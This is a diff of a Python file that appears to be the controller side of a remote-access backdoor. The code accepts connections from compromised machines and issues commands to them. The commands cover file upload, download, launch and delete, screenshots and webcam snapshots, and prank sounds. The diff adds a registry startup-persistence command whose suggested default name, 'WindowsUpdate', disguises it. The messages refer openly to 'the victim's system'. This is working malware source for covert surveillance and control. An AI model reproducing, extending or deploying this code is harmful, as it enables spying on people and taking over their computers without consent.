@@ -1,53 +1,54 @@
 import os
+import sys
 import json
 import socket
 import base64
-import task_manager as tm
-from colorama import init, Fore
+import datetime
+from halo import Halo
+from colorama import Fore, init
 
-#JSON - Way of converting objects to strings
 class server_backdoor:
     required_arguments = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
-    TROLL_PATH = os.getcwd() +  "\Backdoor\SFX\\"
+    TROLL_PATH = os.getcwd() + "\\SFX\\"
     HACKED_SFX = TROLL_PATH + "CrazyLaugh.wav"
     TROLL_SFX = TROLL_PATH + "RunningAway.wav"
-    
-    screenshot_counter = 1
-    webcam_counter = 1
 
     def __init__(self, ip, port):
         try:
+            init()
             self.show_painting()
 
-            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #Address family, Socket type 
-            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)      #Allows us to reuse sockets, so in case our connection drops, we can establish a new one.
-            listener.bind((ip, port))
-            listener.listen(0)      #Number of connections, before the system starts to refuse connections
+            with Halo(text="{}[+] Waiting for Connections.{}".format(Fore.CYAN, Fore.RESET), spinner="dots"):
+                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                listener.bind((ip, port))
+                listener.listen(5)
 
-            print("{}[+] Waiting for connections.{}".format(Fore.CYAN, Fore.WHITE))
-            self.connection, address = listener.accept()
-            print("{}[+] Got a connection from {}{}".format(Fore.GREEN, address, Fore.WHITE))
+                self.connection, address = listener.accept()
+                print("{}[+] Got a connection from {}{}".format(Fore.GREEN, address, Fore.RESET))
         except socket.error as e:
             print("Error connecting: {}".format(e))
+        except KeyboardInterrupt:
+            print("{}[-] Stopping the program.{}".format(Fore.RED, Fore.RESET))
+            sys.exit(0)
 
     def show_painting(self):
         try:
-            init()      #Initializing colorama            
             print("""\t{}______            _       _                  
         | ___ \          | |     | |
         | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
         | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
         | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
         \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
-                                (Python-Backdoor Framework)
+                                (Python-Backdoor)
 
-                                Vesion 1.2
+                                Version 1.4
                                 Github: https://github.com/NoamHarush/                                
-                                                        {}\n\n""".format(Fore.BLUE, Fore.WHITE))
+                                                        {}\n\n""".format(Fore.BLUE, Fore.RESET))
                 
         except Exception as e:
-            return "[-] Couldn't show the starting painting: {}".format(e)
+            return "[-] Couldn't show the start painting: {}".format(e)
 
     def reliable_send(self, data):
         try:
@@ -62,7 +63,7 @@ class server_backdoor:
             try:
                 json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
-            except ValueError:      #We need to receive more data
+            except ValueError:
                 continue
             except Exception as e:
                 return "[-] (Server) Couldn't receive the data, {}.".format(e)
@@ -85,7 +86,7 @@ class server_backdoor:
         try:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
-                return "[+] Successfuly downloaded to: {}.".format(path)   
+                return "[+] Successfully downloaded to: {}.".format(path)
         except Exception as e:
             return "[-] (Server) Couldn't write to: {}, {}.".format(path, e)
 
@@ -98,9 +99,9 @@ class server_backdoor:
 
     def write_webcam_snap(self, data):
         try:
-            file_name = "\\WebcamSnap{}.png".format(self.webcam_counter)
-            self.webcam_counter += 1
-            
+            current_time = datetime.datetime.now()
+            file_name = "\\WebcamSnap{}{}{}.png".format(current_time.year, current_time.month, current_time.day)
+
             path = os.getcwd() + file_name       
             self.write_file(path, data)
 
@@ -109,19 +110,18 @@ class server_backdoor:
             return "[-] Error while trying to save the saved camera snap: {}.".format(e)
 
     def write_screenshot(self, data):
-        try:            
-            file_name = "\\Screenshot{}.png".format(self.screenshot_counter)
-            self.screenshot_counter += 1
+        try:
+            current_time = datetime.datetime.now()
+            file_name = "\\ScreenshotSnap{}{}{}.png".format(current_time.year, current_time.month, current_time.day)
 
             path = os.getcwd() + file_name
             self.write_file(path, data)          
 
             return "[+] Successfully managed to download and save the screenshot at: {}.".format(path)
         except Exception as e:
-            return "[-] Error during download of the screenshot: {}.".format(e)
+            return "[-] Error during the sdownload of the screenshot: {}.".format(e)
 
     def is_valid(self, cmd_0, rest_of_command):
-        #We are checking if the user wrote a command that requires an argument and if he really provided one 
         for i in self.required_arguments:
             if cmd_0 == i:
                 if len(rest_of_command) == 0:
@@ -186,7 +186,7 @@ class server_backdoor:
                     elif command_0 == "upload":
                         p_index = command.index("-p")
                         t_index = command.index("-t")
-                        file_path = " ".join(command[p_index + 1: t_index])     #Getting the file we want to upload location
+                        file_path = " ".join(command[p_index + 1: t_index])
 
                         file_content = self.read_file(file_path)
                         command.append(file_content)
@@ -195,7 +195,7 @@ class server_backdoor:
                             print("[-] (Server) no such parameters for troll.")
                             continue
                         else:
-                            if rest_of_command == "1":   #Hacked version
+                            if rest_of_command == "1":
                                 if os.path.exists(self.HACKED_SFX) and os.path.isfile(self.HACKED_SFX):
                                     print("[+] Uploading necessary files to the victim's system.")
                                     
@@ -204,7 +204,7 @@ class server_backdoor:
                                 else:
                                     print("[-] You are missing HackingSFX.")
                                     continue
-                            elif rest_of_command == "2":     #Troll version
+                            elif rest_of_command == "2":
                                 if os.path.exists(self.TROLL_SFX) and os.path.isfile(self.TROLL_SFX):
                                     print("[+] Uploading necessary files to the victim's system.")
 
@@ -213,6 +213,9 @@ class server_backdoor:
                                 else:
                                     print("[-] You are missing TrollSFX.")
                                     continue
+                    elif command_0 == "startup" or command_0 == "rmstartup":
+                        reg_name = input("Enter the Registry name: (default: WindowsUpdate). ")
+                        command.append(reg_name)
 
                     result = self.execute_remotely(command)
                     if "[-]" not in result:                        
@@ -224,11 +227,11 @@ class server_backdoor:
                         elif command_0 == "webcam":
                             result = self.write_webcam_snap(result)
                 else:
-                    result = "[-] (Server) You wrote incorrectly the command, for help write help."                    
+                    result = "{}[-] (Server) You wrote incorrectly the command, for help write help.{}".format(Fore.RED, Fore.RESET)
             except Exception as e:
                 result = "\n[-] (Server) Error during command execution: {}.".format(e)
  
             print(result)
 
-server = server_backdoor("192.168.1.107", 4040)
+server = server_backdoor("192.168.1.116", 8080)
 server.run()
